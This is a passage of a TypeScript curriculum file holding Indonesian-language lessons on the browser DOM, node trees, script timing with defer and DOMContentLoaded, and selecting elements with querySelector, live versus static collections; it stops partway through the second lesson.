import {
  callout,
  checklist,
  code,
  compare,
  divider,
  h2,
  ol,
  p,
  playground,
  references,
  table,
  terms,
  ul,
} from '@/lib/content/builders';
import { type LessonDraft, written } from '@/lib/curriculum/authoring';

/**
 * Frontend Basic — Chapter 4, all thirteen lessons.
 *
 * This chapter is what makes React comprehensible later: everything React automates is done by
 * hand here first, so the reader knows what is being automated and why it is worth it.
 */
export const lessons: LessonDraft[] = [
  written(
    'apa-itu-dom',
    'Apa itu DOM & Pohon Node',
    22,
    'HTML sebagai struktur pohon yang bisa dibaca dan diubah dari kode.',
    [
      p(
        'Browser tidak menyimpan halamanmu sebagai teks HTML. Saat memuat, ia mengurai teks itu menjadi **pohon objek** — dan objek itulah yang dirender, diubah, dan dibaca JavaScript. Pohon itu disebut DOM (Document Object Model).',
      ),

      terms(
        {
          term: 'DOM',
          meaning:
            'Singkatan *Document Object Model*, dibaca "dom", terjemahannya **model objek dokumen**. Perlu diluruskan sejak awal: browser **tidak** menyimpan halamanmu sebagai teks HTML. Saat memuat, ia mengurai teks itu menjadi **pohon objek**, dan objek itulah yang digambar ke layar serta dibaca JavaScript. Mengubah DOM berarti mengubah pohon itu — teks HTML aslinya tidak pernah ikut berubah.',
        },
        {
          term: 'node',
          meaning:
            'Dibaca "nod", terjemahannya **simpul**. Satu titik di dalam pohon DOM. Yang sering mengejutkan: **teks pun sebuah node**, begitu juga komentar HTML. Karena itu jumlah "anak" sebuah elemen sering lebih banyak daripada yang terlihat mata — spasi dan baris baru di antara tag ikut terhitung.',
        },
        {
          term: 'element',
          meaning:
            'Jenis node yang berasal dari sebuah tag HTML: `<h1>`, `<p>`, `<div>`. Semua element adalah node, tapi **tidak semua node adalah element**. Pembedaan ini yang menjelaskan kenapa ada `childNodes` (semua node) dan `children` (hanya element) — dan kenapa keduanya sering memberi jumlah berbeda.',
        },
        {
          term: 'text node',
          meaning:
            'Node yang isinya teks murni, ditandai `#text` pada diagram pohon. Setiap potongan teks di antara tag punya node-nya sendiri. Inilah yang membuat `element.childNodes.length` kadang bernilai 3 padahal secara visual hanya ada satu tag di dalamnya.',
        },
        {
          term: 'document',
          meaning:
            'Objek yang menjadi **akar** seluruh pohon DOM sekaligus pintu masuk untuk mengaksesnya dari JavaScript. Semua pencarian elemen berangkat dari sini: `document.querySelector(...)`. Ia hanya ada di browser — di Node.js memanggilnya menghasilkan `ReferenceError`, seperti dibahas di Sub-bab 1.1.',
        },
        {
          term: 'parse',
          meaning:
            'Artinya **membedah teks menjadi struktur bermakna**. Proses browser membaca HTML dari atas ke bawah lalu menyusun pohon DOM. Karena berjalan dari atas ke bawah, skrip yang mencari elemen sebelum elemennya sempat diurai akan menemukan `null` — alasan atribut `defer` ada.',
        },
        {
          term: 'render',
          meaning:
            'Artinya **menggambar ke layar**. Tahap setelah parse, ketika browser mengubah pohon DOM ditambah aturan CSS menjadi piksel yang terlihat. Membedakan keduanya penting: mengubah DOM tidak otomatis berarti layar langsung berubah pada saat itu juga.',
        },
        {
          term: 'API',
          meaning:
            'Kumpulan perintah siap pakai. Dalam bab ini yang dimaksud adalah **DOM API** — sekumpulan method dan property seperti `querySelector`, `textContent`, dan `addEventListener` yang disediakan browser untuk membaca dan mengubah pohon itu.',
        },
        {
          term: 'pohon',
          meaning:
            'Terjemahan dari *tree*. Struktur data berbentuk cabang dengan satu akar, di mana tiap simpul boleh punya banyak anak tapi hanya satu induk. Kosakata keluarga dipakai konsisten sepanjang bab ini: *parent* (induk), *child* (anak), *sibling* (saudara), *descendant* (keturunan).',
        },
      ),

      h2('Dari teks ke pohon'),
      code(
        'html',
        `
        <body>
          <h1 class="judul">Halo</h1>
          <p>Isi <strong>penting</strong></p>
        </body>
        `,
      ),
      code(
        'text',
        `
        document
        └── html
            └── body
                ├── h1.judul
                │   └── #text "Halo"
                └── p
                    ├── #text "Isi "
                    └── strong
                        └── #text "penting"
        `,
        { caption: 'Teks pun sebuah node — ini menjelaskan beberapa perilaku yang tampak aneh.' },
      ),
      p(
        'Bandingkan kedua blok itu baris demi baris. HTML yang kamu tulis adalah **teks datar**, sedangkan yang dipegang browser setelah membacanya adalah **pohon**. Seluruh sub-bab ini pada dasarnya tentang perbedaan itu. Perhatikan `#text "Halo"` di bawah `h1`. Teksnya bukan bagian dari elemen `h1`, melainkan node tersendiri yang menjadi anaknya. Hal yang sama terjadi pada `p`, yang ternyata punya **dua** anak, yaitu potongan teks `"Isi "` dan elemen `strong`, padahal di HTML keduanya terlihat menyatu dalam satu baris. Kenyataan bahwa teks pun sebuah node inilah yang menjelaskan dua perilaku yang tampak aneh nanti. Jumlah "anak" sebuah elemen bisa lebih banyak daripada tag yang kamu lihat, dan spasi serta baris baru dalam HTML-mu ikut terhitung.',
      ),

      h2('Jenis node yang perlu kamu tahu'),
      table(
        ['Jenis', 'Contoh', 'Catatan'],
        [
          ['Element', '`<div>`, `<p>`', 'Yang biasanya kamu maksud'],
          ['Text', '`"Halo"`, spasi, baris baru', 'Termasuk indentasi di HTML-mu'],
          ['Comment', '`<!-- -->`', 'Ikut ada di pohon'],
          ['Document', '`document`', 'Akar pohon'],
        ],
      ),
      code(
        'js',
        `
        const p = document.querySelector('p');

        p.childNodes.length;   // 2 — text node "Isi " DAN element <strong>
        p.children.length;     // 1 — hanya element

        // Hampir selalu kamu ingin 'children', bukan 'childNodes'.
        `,
      ),
      p(
        'Angka `2` versus `1` di sini adalah akibat langsung dari pohon yang baru saja kamu baca. `childNodes` menghitung **semua jenis node**, termasuk potongan teks `"Isi "` dan komentar, sedangkan `children` hanya menghitung **element**. Perbedaannya jauh lebih besar di HTML sungguhan daripada di contoh ringkas ini. Begitu tag ditulis di baris terpisah dengan indentasi rapi, setiap pergantian baris beserta spasinya menjadi text node tersendiri, sehingga sebuah `<ul>` berisi tiga `<li>` bisa punya **tujuh** `childNodes`, yaitu tiga elemen diselingi empat potongan spasi. Itu sebabnya kode yang memakai `childNodes[0]` sering mendapat spasi kosong alih-alih elemen yang dimaksud, dan kenapa saran di komentar terakhir layak diikuti tanpa banyak berpikir.',
      ),
      callout(
        'info',
        'DOM bukan HTML sumbermu',
        'Yang kamu lihat di tab Elements adalah keadaan **saat ini**, bukan berkas aslinya. Browser juga memperbaiki HTML yang salah (menutup tag yang lupa ditutup) dan JavaScript bisa mengubahnya kapan saja. "View source" menampilkan berkas; Elements menampilkan DOM.',
      ),

      h2('Kapan DOM siap'),
      code(
        'js',
        `
        // Skrip di <head> tanpa defer -> DOM belum ada
        document.querySelector('h1');   // null

        // Tiga solusi, dari yang terbaik:
        // 1. <script type="module" src="...">   — otomatis ditunda
        // 2. <script defer src="...">
        // 3. Taruh <script> tepat sebelum </body>

        // Kalau terpaksa:
        document.addEventListener('DOMContentLoaded', () => {
          document.querySelector('h1');   // sekarang ada
        });
        `,
      ),
      p(
        'Masalahnya soal urutan. Kalau `<script>` diletakkan di `<head>` tanpa `defer` atau `type="module"`, browser menjalankannya **saat itu juga**, sebelum sempat mengurai `<body>`, sehingga `<h1>` belum ada di pohon DOM ketika `querySelector` mencarinya. Ketiga solusi di atas sama-sama menunda eksekusi skrip sampai HTML selesai diurai, hanya dengan cara berbeda. `type="module"` dan `defer` menunda otomatis tanpa perlu memindahkan letak tag-nya, sementara menaruh `<script>` di akhir `<body>` menunda secara manual karena browser sudah pasti selesai mengurai semua yang di atasnya lebih dulu.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Kamu memasang skrip pelacak sederhana di halaman produk, yang tugasnya mencatat berapa lama pengguna melihat gambar utama. Kodenya satu baris, yaitu ambil elemen gambarnya lalu pasang pengamat. Di komputermu semuanya bekerja. Begitu dipasang di halaman sungguhan, console penuh error dan pelacaknya tidak pernah jalan.',
      ),
      p(
        'Penyebabnya bukan kode pelacaknya melainkan **kapan** ia dijalankan. Pohon DOM dibangun peramban dari atas ke bawah sambil membaca HTML, dan skrip yang berjalan sebelum sebuah elemen dibaca tidak akan menemukan elemen itu.',
      ),
      code(
        'html',
        `
        <!doctype html>
        <html lang="id">
          <head>
            <!-- Skrip ini berjalan SEBELUM body dibaca. -->
            <script src="/pelacak.js"></script>
          </head>
          <body>
            <img id="gambar-utama" src="/kaos.webp" alt="Kaos polos abu" />
          </body>
        </html>
        `,
        { filename: 'index.html — susunan yang membuat pelacak gagal' },
      ),
      code(
        'js',
        `
        // pelacak.js
        const gambar = document.getElementById('gambar-utama');
        gambar.addEventListener('load', catatTampil);

        // TypeError: Cannot read properties of null (reading 'addEventListener')
        `,
        { filename: 'pelacak.js' },
      ),
      p(
        'Saat baris pertama dijalankan, peramban baru membaca sampai bagian `head`. Elemen `img` di dalam `body` belum ada di pohon DOM, jadi `getElementById` mengembalikan `null`. Ini bukan masalah waktu jaringan atau ukuran berkas, melainkan urutan pembacaan HTML yang berlaku selalu, bahkan pada halaman yang sangat kecil.',
      ),
      code(
        'html',
        `
        <head>
          <!-- defer: berkasnya diunduh sekarang, dijalankan setelah HTML selesai dibaca -->
          <script src="/pelacak.js" defer></script>
        </head>
        `,
        { filename: 'Perbaikan pertama, dan yang paling sering dipakai' },
      ),
      code(
        'html',
        `
        <body>
          <img id="gambar-utama" src="/kaos.webp" alt="Kaos polos abu" />

          <!-- Alternatif: taruh di akhir body, tanpa atribut apa pun. -->
          <script src="/pelacak.js"></script>
        </body>
        `,
        { filename: 'Perbaikan kedua, cukup dengan memindahkan letaknya' },
      ),
      p(
        'Atribut `defer` memisahkan dua hal yang tanpanya menyatu, yaitu **kapan berkasnya diunduh** dan **kapan isinya dijalankan**. Dengan `defer`, unduhan berjalan bersamaan dengan pembacaan HTML sehingga tidak ada waktu terbuang, sedangkan eksekusinya ditunda sampai seluruh HTML selesai dibaca. Ini menggabungkan keunggulan menaruh skrip di `head` dan di akhir `body` sekaligus.',
      ),
      p(
        'Perlu diingat `defer` hanya berlaku untuk skrip eksternal, jadi ia tidak berpengaruh pada blok `<script>` yang isinya ditulis langsung di HTML. Untuk skrip inline, satu-satunya pilihan adalah menaruhnya di akhir `body`, atau membungkus isinya di dalam penangan `DOMContentLoaded`. Skrip bertipe module berperilaku seperti `defer` secara bawaan, sehingga `type="module"` yang sudah dibahas di Bab 1 sekaligus menyelesaikan masalah ini.',
      ),
      code(
        'js',
        `
        // Kalau kamu tidak bisa mengubah letak tag skripnya, tunggu peristiwanya.
        document.addEventListener('DOMContentLoaded', () => {
          const gambar = document.getElementById('gambar-utama');
          gambar.addEventListener('load', catatTampil);
        });

        // Bedanya dengan window 'load':
        // DOMContentLoaded -> HTML selesai dibaca, gambar mungkin belum selesai diunduh
        // load             -> gambar, stylesheet, dan iframe juga sudah selesai
        `,
        { caption: 'Dua peristiwa yang sering tertukar, dengan arti yang berbeda.' },
      ),
      p(
        'Perbedaan `DOMContentLoaded` dan `load` menentukan pilihan pada kasus nyata. Kalau kamu hanya butuh elemennya **ada**, `DOMContentLoaded` cukup dan ia terjadi jauh lebih awal. Kalau kamu butuh ukuran sungguhan sebuah gambar, kamu harus menunggu `load`, sebab sebelum gambarnya terunduh peramban belum tahu dimensinya. Memakai `load` untuk hal yang tidak membutuhkannya membuat interaksi terasa lambat tanpa alasan.',
      ),
      callout(
        'tip',
        'Cara cepat memastikan pohon DOM sudah siap',
        'Ketik `document.readyState` di console. Nilainya `loading` berarti HTML masih dibaca, `interactive` berarti HTML selesai tapi gambar belum, dan `complete` berarti semuanya selesai. Kalau skripmu berjalan saat nilainya masih `loading`, itulah penyebab elemen yang tidak ditemukan.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut semuanya berakar pada satu hal, yaitu pohon DOM yang belum atau sudah tidak berisi yang kamu cari. Ketiga pesan pertama diambil dari Chromium sungguhan.',
      ),
      code(
        'text',
        `
        document.querySelector('#tidakAda').addEventListener('click', () => {});
                                            ^

        TypeError: Cannot read properties of null (reading 'addEventListener')
        `,
        { caption: 'Elemennya tidak ditemukan, dan `null` diperlakukan seperti elemen.' },
      ),
      p(
        'Ini error DOM yang paling sering muncul di seluruh karier seorang frontend. Bacalah sebagai berikut, yaitu `querySelector` mengembalikan `null` dan `null` tidak punya `addEventListener`. Tiga penyebabnya berurutan dari yang paling sering, yaitu skripnya berjalan terlalu awal, pemilihnya salah ketik, dan elemennya memang belum dibuat karena datanya belum sampai.',
      ),
      p(
        'Cara membedakan ketiganya cepat. Buka console setelah halaman selesai dimuat lalu ketik pemilih yang sama. Kalau di sana ia menemukan elemennya, berarti masalahnya waktu. Kalau di sana pun `null`, berarti pemilihnya yang salah atau elemennya memang tidak ada.',
      ),
      code(
        'text',
        `
        document.querySelector('#1abc');
                 ^

        SyntaxError: Failed to execute 'querySelector' on 'Document':
        '#1abc' is not a valid selector.
        `,
        { caption: 'Pemilih CSS yang tidak sah, bukan sekadar tidak ditemukan.' },
      ),
      p(
        "Perhatikan ini `SyntaxError` dan bukan `null`, dan perbedaannya berguna. Pemilih yang **sah tapi tidak cocok** menghasilkan `null`, sedangkan pemilih yang **tidak sah** melempar. Aturan CSS melarang id yang diawali angka, jadi `#1abc` bukan pemilih yang bisa diurai. Kalau id di HTML memang diawali angka, pakai `document.getElementById('1abc')` yang tidak memakai sintaks CSS, atau lebih baik ganti idnya.",
      ),
      code(
        'text',
        `
        document.getElementById('nihil').textContent = 'x';
                                         ^

        TypeError: Cannot set properties of null (setting 'textContent')
        `,
        { caption: 'Versi menulis dari error yang sama.' },
      ),
      p(
        "Perbedaannya dengan pesan pertama hanya kata `set` dan `read`, dan itu menandakan apakah kamu sedang membaca atau menulis. Yang perlu diperhatikan, `getElementById` menerima **id tanpa tanda pagar**, berbeda dari `querySelector` yang menerima pemilih CSS lengkap. Menulis `getElementById('#nihil')` dengan pagar adalah kesalahan yang sering terjadi, dan hasilnya selalu `null` tanpa peringatan.",
      ),
      code(
        'text',
        `
        // Skrip di head, tanpa defer, pada halaman yang datanya dimuat dari API.
        const baris = document.querySelectorAll('.baris-produk');
        console.log(baris.length);

        0
        `,
        { caption: 'Tidak ada error, dan hasilnya kosong.' },
      ),
      p(
        'Ini bentuk yang paling menyesatkan, sebab `querySelectorAll` tidak pernah mengembalikan `null` melainkan daftar kosong. Tidak ada error, dan loop di bawahnya berjalan nol kali tanpa satu pun tanda. Kalau kamu punya loop atas hasil `querySelectorAll` yang seakan tidak melakukan apa-apa, cetak `.length`-nya lebih dulu sebelum menduga logikanya yang salah.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            "`Cannot read properties of null (reading 'addEventListener')`",
            'Elemen tidak ditemukan, biasanya karena skrip berjalan terlalu awal',
            'Tambahkan `defer`, pindahkan ke akhir `body`, atau pakai `type="module"`',
          ],
          [
            '`is not a valid selector`',
            'Sintaks pemilih CSS tidak sah, misalnya id diawali angka',
            'Perbaiki pemilihnya, atau pakai `getElementById` untuk id yang bermasalah',
          ],
          [
            '`Cannot set properties of null`',
            'Sama seperti di atas, hanya saja sedang menulis',
            'Periksa keberadaan elemennya lebih dulu sebelum menulis',
          ],
          [
            '`querySelectorAll` menghasilkan panjang nol',
            'Elemennya belum dibuat, atau kelasnya berbeda',
            'Cetak `.length`, dan periksa apakah elemennya dibuat setelah data sampai',
          ],
          [
            'Ukuran elemen terbaca nol',
            'Diukur sebelum gambar atau font selesai dimuat',
            'Tunggu peristiwa `load`, bukan `DOMContentLoaded`',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Pemahaman keliru yang paling sering tentang DOM adalah menganggapnya sama dengan berkas HTML yang kamu tulis. DOM adalah **pohon hidup di memori** yang dibangun dari HTML itu, dan keduanya bisa berbeda jauh.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Mengira isi tab Elements di DevTools adalah berkas HTML-nya',
            'Isinya memang terlihat seperti HTML',
            'Tab Elements menampilkan DOM saat ini, termasuk seluruh perubahan yang dibuat JavaScript. Untuk melihat HTML aslinya, pakai View Source atau tab Network',
          ],
          [
            'Menaruh tag skrip di `head` tanpa `defer`',
            'Skrip biasanya memang ditaruh di atas',
            'Skrip itu berjalan sebelum `body` dibaca, sehingga seluruh elemen halaman belum ada. Ia juga menghentikan pembacaan HTML sampai berkasnya selesai diunduh',
          ],
          [
            'Memakai `window.onload` untuk semua penyiapan',
            'Ia paling aman karena menunggu semuanya',
            'Ia menunggu seluruh gambar dan iframe, sehingga tombol bisa tidak berfungsi selama beberapa detik. Pakai `DOMContentLoaded` kecuali kamu benar-benar butuh ukuran gambar',
          ],
          [
            'Menyimpan hasil `querySelector` di variabel modul lalu memakainya nanti',
            'Elemennya kan sudah ditemukan',
            'Kalau elemen itu diganti atau digambar ulang, variabelnya menunjuk elemen lama yang sudah tidak ada di halaman. Ambil ulang saat dibutuhkan, atau pegang induknya yang stabil',
          ],
          [
            'Mengubah HTML lalu heran perubahannya hilang setelah muat ulang',
            'Perubahannya jelas terlihat di layar',
            'DOM hanya hidup di memori tab itu. Untuk menyimpan, kirim ke server atau simpan di penyimpanan peramban',
          ],
          [
            'Mengira setiap spasi dan baris baru di HTML tidak masuk ke DOM',
            'Ia kan hanya format penulisan',
            'Spasi antar-tag menjadi node teks di DOM, sehingga `wadah.childNodes[0]` sering berupa teks kosong bukan elemen. Pakai `children` yang hanya berisi elemen',
          ],
        ],
      ),
      p(
        'Baris terakhir menjadi sumber bug yang membingungkan saat kamu mulai menelusuri pohon secara manual. Perbedaannya perlu dihafal, yaitu `childNodes` berisi **semua** node termasuk teks dan komentar, sedangkan `children` hanya berisi elemen. Hal yang sama berlaku untuk pasangannya, yaitu `firstChild` melawan `firstElementChild`, dan `nextSibling` melawan `nextElementSibling`. Untuk hampir semua keperluan, versi yang menyebut kata Element adalah yang kamu maksud.',
      ),
      callout(
        'info',
        'DOM bukan bagian dari bahasa JavaScript',
        'DOM adalah API yang disediakan peramban dan didefinisikan oleh WHATWG, bukan oleh spesifikasi bahasa JavaScript. Itulah kenapa `document` tidak ada di Node.js, seperti sudah dibahas di Bab 1. Bahasa lain yang berjalan di peramban akan memakai DOM yang sama persis, sebab ia milik peramban bukan milik JavaScript.',
      ),
      divider,
      h2('Rangkuman'),
      ul(
        'DOM adalah pohon objek hasil parsing HTML — bukan teks HTML itu sendiri.',
        'Spasi dan baris baru menjadi text node; `children` mengabaikannya, `childNodes` tidak.',
        'DOM mencerminkan keadaan sekarang, bukan berkas sumber.',
        '`type="module"` atau `defer` menjamin DOM sudah ada saat skrip berjalan.',
      ),
      references(
        {
          label: 'Introduction to the DOM',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction',
          source: 'MDN',
          note: 'Pengantar resmi: apa itu DOM, kenapa ia pohon, dan hubungannya dengan HTML sumber.',
        },
        {
          label: 'Node',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node',
          source: 'MDN',
          note: 'Daftar seluruh jenis node, termasuk text node dan comment node yang sering terlupakan.',
        },
        {
          label: 'Document',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Document',
          source: 'MDN',
          note: 'Akar pohon sekaligus pintu masuk seluruh DOM API yang dipakai sepanjang bab ini.',
        },
        {
          label: 'Node.childNodes',
          href: 'https://developer.mozilla.org/en-US/docs/Web/API/Node/childNodes',
          source: 'MDN',
          note: 'Menegaskan bahwa spasi dan baris baru ikut terhitung — beda dari `children`.',
        },
        {
          label: 'DOM Standard',
          href: 'https://dom.spec.whatwg.org/',
          source: 'WHATWG',
          note: 'Spesifikasi aslinya, source of truth untuk perilaku yang dibahas di seluruh bab ini.',
        },
      ),
    ],
  ),

  written(
    'seleksi-elemen',
    'Menyeleksi Elemen',
    19,
    'Menemukan elemen yang ingin kamu ubah — dan menghindari jebakan koleksi hidup.',
    [
      terms(
        {
          term: 'selector',
          meaning:
            'Dibaca "se-lek-tor", terjemahannya **penyeleksi** atau pola pencari. Teks pola yang menjelaskan elemen mana yang kamu cari, memakai tata bahasa yang **sama persis dengan CSS**: `.kartu` untuk class, `#menu` untuk id, `input[type="email"]` untuk atribut. Keuntungan besarnya: kalau kamu sudah bisa menulis CSS, kamu sudah bisa mencari elemen.',
        },
        {
          term: 'querySelector',
          meaning:
            'Gabungan *query* (menanyakan) dan *selector*. Mencari elemen **pertama** yang cocok dengan pola, atau `null` kalau tidak ada. Yang perlu diwaspadai: salah ketik selector **tidak melempar error apa pun** — ia hanya memberi `null`, dan errornya baru muncul di baris berikutnya dengan pesan yang membingungkan.',
        },
        {
          term: 'querySelectorAll',
          meaning:
            'Mencari **semua** elemen yang cocok dan mengembalikannya sebagai `NodeList`. Kalau tidak ada yang cocok, hasilnya `NodeList` kosong — bukan `null`. Karena itu memanggilnya lalu langsung mem-`forEach` selalu aman, tidak seperti `querySelector`.',
        },
        {
          term: 'NodeList',
          meaning:
            'Kumpulan node hasil pencarian. **Mirip array tapi bukan array**: ia punya `length` dan `forEach`, tapi tidak punya `map`, `filter`, maupun `reduce`. Untuk memakainya, ubah dulu jadi array asli dengan `Array.from(...)` atau spread `[...]`.',
        },
        {
          term: 'HTMLCollection',
          meaning:
            'Jenis kumpulan lain yang dikembalikan API lama seperti `getElementsByClassName`. Bahkan lebih terbatas daripada `NodeList` — ia **tidak punya `forEach` sama sekali**. Ini salah satu alasan `querySelectorAll` lebih dianjurkan.',
        },
        {
          term: 'koleksi hidup',
          meaning:
            'Terjemahan dari *live collection*. Kumpulan yang **ikut berubah otomatis** ketika DOM berubah — menambah elemen baru membuat isinya bertambah dengan sendirinya. Terdengar praktis, tapi berbahaya di dalam loop: menghapus elemen sambil menelusurinya membuat indeks bergeser dan sebagian elemen terlewat.',
        },
        {
          term: 'koleksi statis',
          meaning:
            'Kebalikannya: potret sesaat yang **tidak ikut berubah** setelah dibuat. `querySelectorAll` mengembalikan yang statis, dan justru itulah yang membuatnya aman dipakai di dalam loop.',
        },
        {
          term: 'akar pencarian',
          meaning:
            'Titik awal pencarian. `document.querySelector(...)` mencari di seluruh halaman, sementara `kartu.querySelector(...)` mencari **hanya di dalam** elemen `kartu`. Membatasi akar membuat pencarian lebih cepat sekaligus lebih tahan terhadap elemen bernama sama di bagian lain halaman.',
        },
        {
          term: 'el',
          meaning:
            'Singkatan *element*, nama variabel yang lazim dipakai untuk menampung hasil seleksi. Seperti `fn` dan `arr`, ini kebiasaan penamaan — bukan kata kunci.',
        },
      ),

      h2('Yang perlu kamu pakai'),
      code(
        'js',
        `
        document.querySelector('.kartu');          // elemen PERTAMA yang cocok, atau null
        document.querySelectorAll('.kartu');       // NodeList semua yang cocok
        document.getElementById('menu');           // paling cepat, tapi hanya untuk id

        // Selector CSS apa pun berlaku
        document.querySelector('#daftar > li:first-child');
        document.querySelector('[data-status="aktif"]');
        document.querySelector('input[type="email"]');
        `,
      ),
      p(
        'Perbedaan `querySelector` dan `querySelectorAll` bukan sekadar jumlah, melainkan **jenis** yang kamu terima. Yang pertama mengembalikan satu elemen atau `null`, sedangkan yang kedua selalu mengembalikan NodeList, bahkan ketika kosong. Karena itu `querySelectorAll` tidak pernah menghasilkan `null`, dan memeriksa `.length` adalah cara yang benar untuk mengetahui apakah ada yang cocok. `getElementById` masih disebut karena ia jalur tercepat, tapi selisih kecepatannya tidak relevan untuk kode aplikasi biasa. Yang membuatnya kadang tetap dipilih adalah kejelasan maksud. Tiga baris terakhir menunjukkan keunggulan sesungguhnya `querySelector`, yaitu bahwa **selector CSS apa pun berlaku**. Pengetahuan CSS yang sudah kamu punya langsung terpakai, mulai dari kombinator `>`, pseudo-class `:first-child`, sampai selector atribut seperti `[data-status="aktif"]`.',
      ),
      callout(
        'warning',
        '`querySelector` mengembalikan `null`, bukan error',
        'Salah ketik selector tidak melempar apa-apa — kamu baru tahu saat baris berikutnya melempar `Cannot read properties of null`. Untuk elemen yang wajib ada, periksa dan lempar error yang menjelaskan.',
      ),
      code(
        'js',
        `
        function wajibAda(selector, akar = document) {
          const el = akar.querySelector(selector);
          if (!el) throw new Error(\`Elemen tidak ditemukan: \${selector}\`);
          return el;
        }
        `,
      ),
      p(
        "Pembungkus sependek ini memindahkan kegagalan ke tempat yang benar. Tanpanya, selector yang salah ketik menghasilkan `null` yang diam, lalu meledak beberapa baris kemudian dengan pesan `Cannot read properties of null`, yang **tidak menyebut selector mana** yang bermasalah sehingga kamu harus menelusuri sendiri. Dengan `wajibAda`, errornya muncul tepat di titik pencarian dan membawa selectornya di dalam pesan. Parameter kedua `akar = document` adalah nilai bawaan yang membuatnya bisa dipakai dua cara. `wajibAda('.kartu')` mencari di seluruh dokumen, sedangkan `wajibAda('.tombol', kartu)` membatasi pencarian ke dalam satu elemen, persis pembatasan yang dibahas di bagian berikutnya. Pakai ini untuk elemen yang **wajib** ada, sementara untuk elemen yang memang boleh tidak ada, `querySelector` biasa beserta pemeriksaan `if (el)` justru yang tepat.",
      ),

      h2('Menyeleksi di dalam elemen, bukan seluruh dokumen'),
      code(
        'js',
        `
        const kartu = document.querySelector('.kartu');

        // SALAH: mencari di SELURUH halaman — bisa dapat tombol kartu lain
        const tombol = document.querySelector('.tombol');

        // BENAR: dibatasi ke dalam kartu ini
        const tombol2 = kartu.querySelector('.tombol');
        `,
      ),
      p(
        "Bayangkan halaman dengan banyak kartu produk, masing-masing punya tombol \"Beli\". `document.querySelector('.tombol')` mencari ke **seluruh halaman** dan selalu mengembalikan tombol kartu **pertama**, apa pun kartu yang sedang kamu proses — bug yang sangat mudah lolos saat testing dengan satu kartu saja, dan baru terlihat begitu ada dua kartu atau lebih. `kartu.querySelector('.tombol')` membatasi pencariannya hanya ke dalam elemen `kartu` itu sendiri, sehingga selalu mendapat tombol yang benar-benar berpasangan dengan kartu yang sedang dipegang.",
      ),

      h2('NodeList bukan array'),
      code(
        'js',
        `
        const semua = document.querySelectorAll('.kartu');

        semua.forEach((el) => el.remove());   // forEach: ADA
        semua.map((el) => el.id);             // TypeError — map tidak ada

        [...semua].map((el) => el.id);        // ubah jadi array dulu
        Array.from(semua).filter(...);
        `,
      ),
      p(
        'Kejutan di sini adalah `forEach` **ada** tapi `map` **tidak**, kombinasi yang membingungkan karena keduanya terasa satu paket. Penyebabnya, `NodeList` bukan array melainkan jenis koleksi tersendiri yang kebetulan diberi `forEach` karena terlalu sering dibutuhkan, sedangkan sisa method array seperti `map`, `filter`, dan `reduce` tidak pernah ditambahkan. Karena itu memanggil `semua.map(...)` menghasilkan `TypeError`, dan pesannya menyebut `map is not a function`, bukan sesuatu yang langsung membuat orang teringat pada perbedaan NodeList dan array. Dua baris terakhir menunjukkan obatnya, dan keduanya setara. Spread `[...semua]` maupun `Array.from(semua)` menyalin isinya ke array sungguhan, setelah itu seluruh method array berlaku seperti biasa.',
      ),

      h2('Koleksi hidup vs statis — jebakan nyata'),
      code(
        'js',
        `
        const hidup  = document.getElementsByClassName('item');   // HIDUP
        const statis = document.querySelectorAll('.item');        // STATIS

        // Awalnya ada 3 item
        hidup.length;    // 3
        statis.length;   // 3

        document.querySelector('.item').remove();

        hidup.length;    // 2 — ikut berubah sendiri
        statis.length;   // 3 — potret saat dipanggil
        `,
        { caption: 'Dua koleksi dari dokumen yang sama, berperilaku berbeda setelah DOM berubah.' },
      ),
      p(
        'Kedua baris deklarasi terlihat mengerjakan hal yang sama, dan sebelum DOM berubah keduanya memang melaporkan `3`. Perbedaannya baru muncul setelah satu elemen dihapus. `getElementsByClassName` mengembalikan **koleksi hidup**, yaitu bukan daftar hasil melainkan kueri yang terus tersambung ke dokumen dan menghitung ulang dirinya setiap kali dibaca. `querySelectorAll` mengembalikan **potret**, sehingga hasilnya dikunci pada saat pemanggilan dan tidak pernah berubah lagi meski dokumennya berubah total. Tidak ada yang lebih benar di antara keduanya, tapi yang hidup jauh lebih mudah mengejutkan, terutama di dalam loop seperti yang diperingatkan di bawah. Kalau kamu tidak punya alasan khusus membutuhkan koleksi yang memperbarui diri, pilih `querySelectorAll` supaya jumlah yang kamu pegang tidak berubah di tengah pekerjaan.',
      ),
      callout(
        'danger',
        'Loop atas koleksi hidup yang menghapus elemen akan melewati separuhnya',
        'Setiap penghapusan menggeser indeks koleksi hidup, sementara indeks loop terus maju. Untuk `getElementsByClassName`, salin dulu ke array (`[...koleksi]`), atau pakai `querySelectorAll` yang statis.',
      ),

      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Tabel pesanan di panel admin punya tombol Batalkan di tiap barisnya, filter status di atasnya, dan tombol Muat Lagi di bawahnya yang menambah dua puluh baris tanpa memuat ulang halaman. Kamu menulis kode yang mengambil semua tombol Batalkan lalu memasang penangan klik. Semuanya bekerja untuk dua puluh baris pertama, dan tombol pada baris yang ditambahkan kemudian tidak melakukan apa-apa.',
      ),
      p(
        'Bug ini punya dua penyebab yang sering tertukar, dan sub-bab ini menjelaskan yang pertama. Penyebab kedua, yaitu penangan yang hanya dipasang sekali, dibahas di Sub-bab 4.8. Yang pertama adalah perbedaan antara daftar yang ikut berubah dan daftar yang membeku.',
      ),
      code(
        'js',
        `
        const wadah = document.getElementById('daftar-pesanan');

        // getElementsByClassName menghasilkan koleksi HIDUP.
        const hidup = wadah.getElementsByClassName('baris');

        // querySelectorAll menghasilkan daftar STATIS.
        const statis = wadah.querySelectorAll('.baris');

        // Tambahkan satu baris baru.
        const baru = document.createElement('p');
        baru.className = 'baris';
        wadah.appendChild(baru);

        console.log(hidup.length);    // 3  <- ikut bertambah sendiri
        console.log(statis.length);   // 2  <- tetap seperti saat diambil
        `,
        { caption: 'Diukur sungguhan di Chromium, bukan diperkirakan.' },
      ),
      p(
